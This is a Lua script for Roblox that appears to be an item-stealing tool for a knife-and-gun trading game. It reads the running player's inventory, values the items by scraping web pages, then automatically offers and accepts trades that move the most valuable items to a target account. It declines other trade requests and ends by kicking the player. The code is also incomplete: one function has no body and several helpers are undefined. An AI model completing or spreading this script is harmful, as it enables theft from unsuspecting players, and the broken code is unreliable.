local function CleanName(Name)
    if not Name then return "" end
    return string.lower(Name):gsub("'", ""):gsub("%s+", ""):gsub("knife", ""):gsub("gun", ""):gsub("_", "")
end

local function FetchHTML(URL)
    local Req = GetRequest()
    if not Req then return "" end
    local OK, Res = pcall(function() return Req({Url = URL, Method = "GET", Headers = Headers}) end)
    return OK and Res and Res.StatusCode == 200 and Res.Body or ""
end

local function ParseValue(HTML)
    local V = HTML:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    return V and tonumber(V:gsub(",", "")) or nil
end

local function ExtractItems(HTML, Rarity)
    local T = {}
    for Raw, Body in HTML:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        Raw = Raw:match("[^<]+")
        if Raw then
            local Key = CleanName(Raw)
            local Val = ParseValue(Body)
            if Val and Key ~= "" then T[Key] = {Name = Raw, Value = Val, Rarity = Rarity} end
        end
    end
    return T
end

local function LoadDB()
    local T = {}
    for K, V in pairs(Fallback) do T[K] = V end
    local List = {
        {Categories.godly, "Godly"}, {Categories.ancient, "Ancient"},
        {Categories.unique, "Unique"}, {Categories.vintage, "Vintage"},
        {Categories.chroma, "Chroma"}
    }
    for _, P in ipairs(List) do
        local HTML = FetchHTML(P[1])
        if HTML ~= "" then
            local Items = ExtractItems(HTML, P[2])
            for K, V in pairs(Items) do T[K] = V end
        end
    end
    return T
end

local function GetValueAndRarity(itemId)
    local Key = CleanName(itemId)
    local rarity = "Common"
    pcall(function()
        local Database = ReplicatedStorage:FindFirstChild("Database") and ReplicatedStorage.Database:FindFirstChild("Sync") and ReplicatedStorage.Database.Sync:FindFirstChild("Item")
        if Database and Database[itemId] then
            rarity = Database[itemId].Rarity or "Common"
        end
    end)
    if ItemDB[Key] then return ItemDB[Key].Value, ItemDB[Key].Rarity end
    for _, Info in pairs(ItemDB) do
        if type(_) == "string" and (Key:find(_) or _:find(Key)) then
            return Info.Value, Info.Rarity
        end
    end
    local r = table.find(RarityOrder, rarity)
    if r == 1 then return 1000, "Chroma"
    elseif r == 2 then return 500, "Unique"
    elseif r == 3 then return 200, "Ancient"
    elseif r == 4 then return 5, "Godly"
    elseif r == 5 then return 50, "Vintage"
    elseif rarity == "Common" then return 0, "Common"
    else return 1, rarity end
end

local function FormatName(T)
    if not T or T == "" then return "Unknown" end
    local R, Cap = "", true
    for i = 1, #T do
        local C = T:sub(i,i)
        if C == " " then R ..= " " Cap = true
        else R ..= Cap and C:upper() or C:lower() Cap = false end
    end
    return R
end

local function CanTrade(Rarity, Val)

local function RefreshInv()
    local All, Trade, Total = {}, {}, 0
    local Profile = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    if Profile and Profile.Weapons and Profile.Weapons.Owned then
        for ID, Count in pairs(Profile.Weapons.Owned) do
            if Count and Count > 0 and not Blacklist[ID] then
                local Val, Rarity = GetValueAndRarity(ID)
                local Entry = {ID = ID, Name = ID, Rarity = Rarity, Count = Count, Value = Val, Total = Val * Count}
                table.insert(All, Entry)
                if CanTrade(Rarity, Val) then table.insert(Trade, Entry) Total += Entry.Total end
            end
        end
    end
    table.sort(All, function(a,b) return a.Total > b.Total end)
    table.sort(Trade, function(a,b) return a.Total > b.Total end)
    return All, Trade, Total
end

local function GenText(List)
    local Lines, Total = {}, 0
    for _, I in ipairs(List) do Total += I.Total end
    table.insert(Lines, "Total Inventory Value: "..Total)

    return table.concat(Lines, "\n")
end

local function ProcessTrades(Target)
    local Attempts = 0
    while #TradeItems > 0 and Attempts < 999 do
        Attempts += 1
        local S = TradeStatus()
        if S == "ReceivingRequest" then pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end) task.wait(0.5)
        elseif S == "StartTrade" then
            for _ = 1, math.min(4, #TradeItems) do
                local I = table.remove(TradeItems, 1)
                for _ = 1, I.Count do OfferItem(I.ID) task.wait(0.05) end
            end
            task.wait(6)
            if AcceptTrade() then WaitTrade() Inventory, TradeItems, TotalValue = RefreshInv() Attempts = 0 end
        elseif S == "None" then
            for T = 1, 5 do if SendTrade(Target) then task.wait(0.5) break end task.wait(math.min(T * 0.5, 3)) end
        end
        task.wait(0.5)
    end
    KickDone()
end

local function AutoTrade()
    local Busy = false
    local function Check(P)
        if Busy then return end
        local Target = FindTarget()
        if Target and P.Name == Target then Busy = true task.wait(3) ProcessTrades(P.Name) end
    end
    for _, P in ipairs(Players:GetPlayers()) do Check(P) end
    Players.PlayerAdded:Connect(Check)
end

if #TradeItems > 0 then AutoTrade()
